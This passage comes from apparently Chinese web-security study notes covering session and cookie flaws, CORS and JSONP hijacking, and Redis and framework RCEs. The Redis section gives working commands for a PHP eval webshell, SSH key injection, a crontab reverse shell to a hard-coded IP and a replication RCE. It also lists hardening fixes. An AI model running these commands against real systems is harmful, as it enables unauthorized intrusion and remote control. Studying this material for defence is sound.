class="hljs-number">2</span>，如果接口存在逻辑处理问题，以试用价格去支付，就是可能为<span class="hljs-number">0</span>元。<br></code></pre></td></tr></table></figure><h3 id="短信-邮箱轰炸漏洞"><a class="header-anchor" href="#短信-邮箱轰炸漏洞">¶</a>短信/邮箱轰炸漏洞</h3><h3 id="利用Cookie-Session"><a class="header-anchor" href="#利用Cookie-Session">¶</a>利用Cookie&amp;Session</h3><blockquote><p><code>session </code>机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表） 来保存信息。 当程序需要为某个客户端的请求创建一个 session 的时候，服务器首先检查这个客户端的请求里是否已包含了一个 session 标识，称为 session id，如果已包含一个 session id 则说明以前已经为此客户端创建过 session，服务器就按照 session id 把这个 session 检索出来使用（如果检索不到，可能会新建一个），如果 客户端请求不包含 session id，则为此客户端创建一个 session 并且生成一个与此 session 相关联的 session id， session id 的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个 session id 将被在本次响 应中返回给客户端保存。</p><p>保存这个 session id 的方式可以采用 cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给服务器。</p></blockquote><h4 id="Session的特点"><a class="header-anchor" href="#Session的特点">¶</a>Session的特点</h4><p>session 一般用于登录验证 。</p><p>session 的存活周期：<br>○ 默认关闭浏览器，session 就会消失。<br>○ 在程序中设置 session 的过期时间。</p><p>session 是存在于服务器里，cookie 是存在于客户端的。</p><p>session 的机制：</p><ol><li>是会在浏览器生成一个 cookie session_id 也会在服务器里生成一个 session id 文件，假如在做身份证认证的时候就会在这个服务器里的文件写入要验证的内容。</li><li>在 php 里 session 的存放位置是在 php.ini 里设置的，也可以通过函数设置在其他位置 。</li></ol><h4 id="Cookie"><a class="header-anchor" href="#Cookie">¶</a>Cookie</h4><p><strong>区别</strong></p><p>​session 机制采用的是在<strong>服务器端</strong>保持状态的方案，而 cookie 机制则是在<strong>客户端</strong>保持状态的方案，Cookie 是由 HTTP 服务器设置的，保存在浏览器中cookie 又叫会话跟踪机制。打开一次浏览器到关闭浏览器算是一次会话。说到这里，讲下 HTTP 协议，前面提到， HTTP 协议是一种无状态协议，在数据交换完毕后，服务器端和客户端的链接就会关闭，每次交换数据都需要建立新的链接。此时，服务器无法从链接上跟踪会话。cookie 可以跟踪会话，弥补 HTTP 无状态协议的 不足。</p><p><strong>Cookie分类</strong></p><p>cookie 分为<strong>会话 cookie</strong> 和<strong>持久 cookie</strong></p><p>会话 cookie 是指在不设定它的生命周期 expires 时的状态</p><p>浏览器的开启到关闭就是一次会话，当关闭浏览器时，会话 cookie 就会跟随浏览器而销毁。当关闭一个页面时，不影响会话 cookie 。</p><p>持久 cookie 则是设定了它的生命周期 expires</p><p>关闭浏览器之后，它不会销毁，直到设定的过期时间。对于持久 cookie，可以在同一个浏览器中传递数据。</p><p><strong>漏洞</strong></p><p>Cookie仿冒</p><p>Cookie登录绕过漏洞</p><p><strong>防御</strong></p><ol><li>使用 cookie 身份验证时，不要使用简单的验证，对外部输入的参数进行过滤.。</li><li>尽量使用  session 安全认证，session 是外部不可控的。</li></ol><p><strong>业务逻辑漏洞推荐书籍</strong></p><p>《Web攻防之业务安全实战指南》</p><h1>未授权访问</h1><p>总结：无</p><h1>Jsonp&amp;Cors</h1><h2 id="基础知识-v3"><a class="header-anchor" href="#基础知识-v3">¶</a>基础知识</h2><h3 id="同源策略"><a class="header-anchor" href="#同源策略">¶</a>同源策略</h3><p><strong>SOP</strong>，全称为同源策略 (Same Origin Policy)，该策略是浏览器的一个安全基石， 如果没有同源策略，那么，你打开了一个合法网站，又打开了一个恶意网站。那么恶意网站的脚本能够随意的操作合法网站的任何可操作资源，没有任何限制。</p><p>两个站点需要满足同协议、同端口、同域名。这三个条件即为 “同源”。</p><p><strong>下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;script src=<span class="hljs-string">&quot;...&quot;</span>&gt;<span class="hljs-regexp">//</span>加载本地js执行<br>&lt;img src=<span class="hljs-string">&quot;...&quot;</span>&gt;<span class="hljs-regexp">//</span>图片<br>&lt;link href=<span class="hljs-string">&quot;...&quot;</span>&gt;<span class="hljs-regexp">//</span>css<br>&lt;iframe src=<span class="hljs-string">&quot;...&quot;</span>&gt; <span class="hljs-regexp">//</span>任意资源<br></code></pre></td></tr></table></figure><h2 id="CORS"><a class="header-anchor" href="#CORS">¶</a>CORS</h2><p>CORS（Cross-Origin Resource Sharing）跨域资源共享，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，<strong>它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AX只能同源使用的限制。</strong></p><p>CORS的基本原理是：第三方网站生成访问控制策略，指定用户浏览器放宽SOP的限制，实现与指定的目 标网站共享数据。</p><h2 id="漏洞原理"><a class="header-anchor" href="#漏洞原理">¶</a>漏洞原理</h2><p>​因为同源策略的存在，不同源的客户端脚本不能访问目标站点的资源，如果目标站点CORS配置不当，没有对请求源的域做严格限制，导致任意源都可以访问时，就存在cors跨域漏洞问题。</p><p>​攻击者可以利用Web应用对用户请求数据包的Origin头校验不严格，诱骗受害者访问攻击者制作好的恶意网站，从而跨域获取受害者的敏感数据。</p><p><strong>CORS跨域漏洞的本质是服务器配置不当</strong></p><h3 id="CORS中关键的几个响应头字段如下："><a class="header-anchor" href="#CORS中关键的几个响应头字段如下：">¶</a>CORS中关键的几个响应头字段如下：</h3><p>Access-Control-Allow-Origin：指定哪些外域可以访问本域资源；</p><p>Access-Control-Allow-Credentials：指定浏览器是否将使用请求发送Cookie。仅当设置为true</p><p>时，才会发送Cookie；默认是false</p><p>Access-Control-Allow-Methods：指定可以使用哪些HTTP请求方法（GET、POST、PUT、DELETE</p><p>等）来访问资源；</p><p>Access-Control-Allow-Headers：指定可以在请求报文中添加的HTTP头字段； Access-Control-Max-Age：指定超时时间；</p><h2 id="CORS挖掘思路"><a class="header-anchor" href="#CORS挖掘思路">¶</a>CORS挖掘思路</h2><p>CORS的漏洞主要看当我们发起的请求中带有Origin 头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin 的域访问。</p><p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。</p><h2 id="JSONP"><a class="header-anchor" href="#JSONP">¶</a>JSONP</h2><p>JSONP是JSON with   padding（填充式JSON或参数式JSON）的简写，是基于JSON格式达的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用的script标签的src属性不受同源策略影响的特   性，来跨越获取数据。</p><p>说人话就是：可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p><p>JSONP由两部分组成： 回调函数 、 数据</p><p>回调函数是当响应来时，在页面中调用的函数。回调函数的名称一般是在请求中指定的。而数据就是传入回调函数中的JSON数据。</p><h2 id="JSONP劫持漏洞"><a class="header-anchor" href="#JSONP劫持漏洞">¶</a>JSONP劫持漏洞</h2><p>JSON劫持又称 “JSON Hijacking” 。当网站通过JSONP的方式来跨域传递用户认证后的敏感信息时，<strong>如果服务端对JSONP的请求来源校验不严格，那么攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问达到截取用户敏感信息的目的</strong>。</p><img src="/posts/d62edc36/1690266827967-c7f3cd69-031d-4069-9917-2d915dc64930.jpeg" class title="img"><p>jsonp 与 csrf 类似，都是需要用户登录帐号，身份认证还没有被消除的情况下访问攻击者精心设计好的的页面。就会获取 json 数据，把 json 数据发送给攻击者。</p><p>利用过程：寻找敏感 json 数据 api 接口，构造恶意的代码。 发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。</p><p><strong>产生漏洞的原因</strong>：    网站没有对JSONP请求来源进行校验和过滤导致任意域都能够获取数据。</p><h3 id="流程"><a class="header-anchor" href="#流程">¶</a>流程</h3><ol><li>用户在网站A注册的能路，网站A接口返回数据包含用户的id，name，email等，个人用户数据。</li><li>用户打开攻击者发送给用户的URL，向网站B发起请求</li><li>网站B向用户返回响应页面，响应页面中包含回调函数和向网站B请求的script标签。</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">jsonp2</span>(<span class="hljs-params">data</span>)&#123; <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.xxx.com/api?callback=jsonp2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script src=&quot;https://www.xxx.com/api?callback=jsonp2&quot;&gt;&lt;/script&gt;</code></p><ol start="4"><li>用户收到响应后，解析JS代码，将回调函数作为参数向网站A发送请求</li><li>网站A收到请求后，以JSON格式生成请求需要的数据（用户信息）将数据作为回调函数的参数返回给浏览 器。</li></ol><p>json2({“id”:1,“name”:“test”,“email”:“<a href="mailto:test@test.com">test@test.com</a>”})</p><ol start="6"><li>网站B收到响应数据后，浏览器自动执行回调函数，将返回的数据进行弹窗处理.</li></ol><blockquote><p>PS：SRC挖掘中只有返回了敏感信息的jsonp劫持才能算是有危害。</p></blockquote><h2 id="JSONP漏洞挖掘思路"><a class="header-anchor" href="#JSONP漏洞挖掘思路">¶</a>JSONP漏洞挖掘思路</h2><p>Google Hack语法</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:json</span> inur<span class="hljs-variable">l:callback</span>= site:<span class="hljs-keyword">a</span>.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:json</span><br></code></pre></td></tr></table></figure><p>Burp插件推荐</p><p><a href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p><h2 id="防御方案"><a class="header-anchor" href="#防御方案">¶</a>防御方案</h2><ol><li><ol><li><ol><li>json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数 据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏 感的数据获取做权限认证；</li><li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等；</li><li>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）；</li><li>严格过滤 callback 函数名及 JSON 里数据的输出；</li><li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。</li></ol></li><li></li></ol></li></ol><h1>redis漏洞利用</h1><blockquote><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。</p></blockquote><table><thead><tr><th><strong>漏洞利用方式</strong></th><th><strong>利用前提</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td>写公钥</td><td>root权限运行redis开放了ssh，允许公钥连接</td><td></td></tr><tr><td>反弹shell</td><td>root权限运行redis开启了计划任务</td><td></td></tr><tr><td>写入webshell</td><td>root权限运行redis知道网站根路径</td><td></td></tr><tr><td>主从复制</td><td>redis 4.x/5.x</td><td>无需root权限启动redis，获取的权限为启动用户的权限</td></tr></tbody></table><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。</p><h2 id="漏洞利用-v3"><a class="header-anchor" href="#漏洞利用-v3">¶</a><strong>漏洞利用</strong></h2><h3 id="利用Redis漏洞写WebShell"><a class="header-anchor" href="#利用Redis漏洞写WebShell">¶</a>利用Redis漏洞写WebShell</h3><p><strong>利用前提</strong></p><ol><li>靶机redis链接未授权，在攻击机上能用<code>redis-cli</code>连上，并未登陆验证</li><li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url地址使用蚁剑进行连接）</li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">一、执行以下命令进行GetShell...</span><br><span class="language-xml">config get dir #查看redis数据库路径</span><br><span class="language-xml">config set dir /var/www/html  #修改靶机Redis数据库路径</span><br><span class="language-xml">config set dbfilename 1k.php #生成22.php文件</span><br><span class="language-xml">set xxx &quot;\r\n\r\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="language-xml">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="language-xml">set xxx &quot;\n\n\n</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ph9ar&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\n\n\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="language-xml">save#保存</span><br><span class="language-xml">二、在浏览器访问该`1k.php`的后门文件....并链接验证</span><br></code></pre></td></tr></table></figure><h3 id="利用Redis漏洞SSH密钥链接"><a class="header-anchor" href="#利用Redis漏洞SSH密钥链接">¶</a>利用Redis漏洞SSH密钥链接</h3><p><strong>利用前提</strong></p><p>● Redis服务使用root账号启动<br>● 成功连接redis<br>● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。<br>攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 目标机配置</span><br>systemctl <span class="hljs-literal">start</span> ssh<br><br><span class="hljs-comment"># 攻击机产生公私钥</span><br>ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>执行以下命令操作将公钥写入目标主机的认证文件中…</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 交互式操作</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dir /root/.ssh/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys# <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\n公钥\n\n\n&quot;</span>，将公钥写入x键。前后用\n换行，避免和Redis里其他缓存数据混合<br><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa 【私钥内容】\n\n\n&quot;</span><br>save<br><br><span class="hljs-comment"># 单条命令操作</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">type </span>key.txt | redis-cli.exe -h 192.168.43.141 -x <span class="hljs-built_in">set</span> xxx#如果是linux 将type换成cat<br><span class="hljs-comment">#将公钥作为value插入到数据库中，key随便啥值。</span><br>redis-cli.exe -h 192.168.116.129<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dir /root/.ssh<br><span class="hljs-comment">#修改redis数据库路径</span><br>redis-cli.exe -h 192.168.116.129<span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br><span class="hljs-comment">#生成缓冲文件authorized_keys</span><br>redis-cli.exe -h 192.168.116.129 save<br><span class="hljs-comment">#保存</span><br>ssh -i id_rsa root@192.168.116.129<br><span class="hljs-comment">#连接</span><br></code></pre></td></tr></table></figure><p>进行SSH链接验证…</p><blockquote><ol><li>如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa root@192.168.43.141需要在.ssh目录下，因为权限问题。</li><li>.文件名必须是authorized_keys,由配置文件决定的。</li></ol></blockquote><h3 id="利用Crontab计划任务反弹Shell"><a class="header-anchor" href="#利用Crontab计划任务反弹Shell">¶</a>利用Crontab计划任务反弹Shell</h3><p><strong>漏洞原理</strong></p><p>​在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。</p><p><strong>限制</strong></p><p>反弹shell这里只在<strong>centos</strong>中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。</p><p><strong>操作</strong></p><p>在Centos7系统的VPS上执行Redis的安装部署…并进行未授权访问！成功…</p><p>执行以下命令进行反弹Shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config <span class="hljs-built_in">set</span> dir /var/spool/cron/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename root<br><span class="hljs-built_in">set</span> xxx <span class="hljs-string">&quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/101.42.118.221/8080 0&gt;&amp;1\n\n&quot;</span><br><span class="hljs-comment">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br>save<br></code></pre></td></tr></table></figure><h3 id="利用Redis主从复制反弹Shell"><a class="header-anchor" href="#利用Redis主从复制反弹Shell">¶</a>利用Redis主从复制反弹Shell</h3><blockquote><p><strong>Redis</strong>主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会&gt;影响数据完整性，且读写分开，减轻服务器压力。</p></blockquote><p><strong>原理</strong></p><p>​Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">当<span class="hljs-literal">slave</span>向<span class="hljs-literal">master</span>发送PSYNC命令之后，一般会得到三种回复：<br><span class="hljs-number">1</span>. +FULLRESYNC：进行全量复制。<br><span class="hljs-number">2</span>. +CONTINUE：进行增量同步。<br><span class="hljs-number">3</span>. -ERR：当前<span class="hljs-literal">master</span>还不支持PSYNC。<br>进行全量复制是，会将<span class="hljs-literal">master</span>上的RDB文件同步到<span class="hljs-literal">slave</span>上。而进行增量复制时，<span class="hljs-literal">slave</span>向<span class="hljs-literal">master</span>要求数据同步，会发送<span class="hljs-literal">master</span>的runid和offest，如果runid和<span class="hljs-literal">slave</span>上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件。为了能让恶意so传输到目标服务器上，这里则必须采用全量复制。<br></code></pre></td></tr></table></figure><p><strong>限制</strong></p><p>利用redis主从复制redis版本要是4.x或者5.x</p><p><strong>操作</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一步：git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/n0b0dyCN/</span>RedisModules-ExecuteCommand.git<br>        <span class="hljs-comment">#下载RedisModules-ExecuteCommand</span><br>        <span class="hljs-comment"># 其他项目：https://github.com/vulhub/redis-rogue-getshell</span><br>第二步：git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Ridter/</span>redis-rce<br>        <span class="hljs-comment">#下载redis-rce</span><br>第三步：cd RedisModules-ExecuteCommand<br>第四步:make<br>        <span class="hljs-comment">#进入RedisModules-ExecuteCommand 使用make进行编译</span><br>第五步:mv module.so <span class="hljs-regexp">/root/</span>redis-rce<br>        <span class="hljs-comment">#编译之后将module.so移到redis-rce</span><br>第六步：cd <span class="hljs-regexp">/root/</span>redis-rce<br>第七步：python3 redis-rce.py -r <span class="hljs-number">192.168</span>.<span class="hljs-number">116.129</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">1.3</span> -f module.so  <br>        <span class="hljs-comment">#进入到redis-rce 执行命令，-r是目标IP -L是攻击机ip     </span><br></code></pre></td></tr></table></figure><blockquote><p>有可能执行失败原因是仅支持32位Redis程序利用</p></blockquote><h3 id="SSRF-Redis写入WebShell"><a class="header-anchor" href="#SSRF-Redis写入WebShell">¶</a>SSRF+Redis写入WebShell</h3><blockquote><p>当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击.</p></blockquote><p><strong>利用条件</strong></p><ul><li>知道网站根目录</li><li>根目录具有写文件的权限</li></ul><h3 id="利用MSF破解Redis密码"><a class="header-anchor" href="#利用MSF破解Redis密码">¶</a>利用MSF破解Redis密码</h3><p>调用相对应的MSF模块进行攻击操作</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">msfconsole        <span class="hljs-meta">#开启msf</span><br>search redis      <span class="hljs-meta">#查看有关redis的模块</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">5</span>             <span class="hljs-meta">#选择5号模块即：auxiliary/scanner/redis/redis_login</span><br><span class="hljs-keyword">show</span> options      <span class="hljs-meta">#展示需要设置的参数</span><br>set RHOST <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.3</span> <span class="hljs-meta">#设置靶机的ip</span><br><span class="hljs-keyword">run</span> <span class="hljs-meta">#运行模块</span><br></code></pre></td></tr></table></figure><h3 id="扩展…使用Hydra进行爆破"><a class="header-anchor" href="#扩展…使用Hydra进行爆破">¶</a>扩展…使用Hydra进行爆破</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">hydra -P <span class="hljs-string">./pass.txt</span> redis:<span class="hljs-string">//192.168.229.140</span><span class="hljs-function">:6379</span> -f<br></code></pre></td></tr></table></figure><h3 id="修复参考"><a class="header-anchor" href="#修复参考">¶</a>修复参考</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 修复一</span><br>禁止一些高危命令<br>修改 redis.conf 文件，添加<br><span class="hljs-keyword">rename</span>-command FLUSHALL “”<br><span class="hljs-keyword">rename</span>-command CONFIG “”<br><span class="hljs-keyword">rename</span>-command EVAL “”<br>来禁用远程修改 DB 文件地址<br><br><span class="hljs-comment"># 修复二</span><br>以低权限运行 Redis 服务<br>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis<br><br><span class="hljs-comment"># 修复三</span><br>为 Redis 添加密码验证<br>修改 redis.conf 文件，添加<br>requirepass mypassword<br><br><span class="hljs-comment"># 修复四</span><br>禁止外网访问 Redis<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br><span class="hljs-keyword">bind</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><br><span class="hljs-comment"># 修复五</span><br>保证 authorized_keys 文件的安全<br>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br>$ <span class="hljs-keyword">chmod</span> <span class="hljs-number">400</span> ~<span class="hljs-regexp">/.ssh/au</span>thorized_keys<br>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：<br><span class="hljs-comment"># chattr +i ~/.ssh/authorized_keys</span><br>然而，用户还可以重命名 ~<span class="hljs-regexp">/.ssh，然后新建新的 ~/</span>.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：<br><span class="hljs-comment"># chattr +i ~/.ssh</span><br>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。<br></code></pre></td></tr></table></figure><h1>常见框架漏洞</h1><h2 id="Thinkphp"><a class="header-anchor" href="#Thinkphp">¶</a>Thinkphp</h2><p>TP5 rce：</p><p>Thinkphp5 5.0.22/5.1.29</p><p>Thinkphp5 5.0.23 rce</p><p><strong>更多</strong><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a> <a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><h3 id="问题："><a class="header-anchor" href="#问题：">¶</a>问题：</h3><p><strong>如果给你一个网站你如何识别是否使用了thinkphp框架？</strong></p><ol><li><p>使用指纹识别插件 Wappalyzer</p></li><li><p>通过构建报错的url , 根据报错信息判断</p></li><li><p>根据tp的默认icon 5.路由格式</p></li></ol><h2 id="Struts2"><a class="header-anchor" href="#Struts2">¶</a>Struts2</h2><blockquote><p>Struts 2 是一个基于MVC设计模式的web应用框架：</p><p><strong>MVC</strong>：模型(Model)、视图(View)、控制器(Controller)：</p><p>模型 — 属于软件设计模式的底层基础，主要负责数据维护。视图 — 这部分是负责向用户呈现全部或部分数据。</p><p>控制器 — 通过软件代码控制模型和视图之间的交互。</p></blockquote><h3 id="struts2-rce"><a class="header-anchor" href="#struts2-rce">¶</a>struts2 rce</h3><p><strong>S2-057远程执行代码漏洞原理</strong></p><p>S2-057漏洞产生于网站配置xml的时候，有一个namespace的值，该值并没有做详细的安全过滤导致可以写入到XML上，尤其url标签值也没有做通配符的过滤，导致可以执行远程代码，以及系统命令执行。</p><p>S2-057 先决条件 :</p><p>alwaysSelectFullNamespace 正确 - 操作元素未设置名称空间属性，或使用了通配符用户将从 uri 传递命名空间，并将其解析为 OGNL 表达式，最终导致远程代码执行漏洞</p><h1>spring</h1><p>未授权访问、远程命令执行</p><h3 id="SpEL是什么？"><a class="header-anchor" href="#SpEL是什么？">¶</a>SpEL是什么？</h3><p>SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。</p><h3 id="SpEL原理如下："><a class="header-anchor" href="#SpEL原理如下：">¶</a>SpEL原理如下：</h3><ol><li><ol><li><ol><li>表达式:可以认为就是传入的字符串内容；</li><li>解析器︰将字符串解析为表达式内容；</li><li>上下文:表达式对象执行的环境；</li><li>根对象和活动上下文对象∶根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象。</li></ol></li></ol></li></ol><h2 id="spring-rce"><a 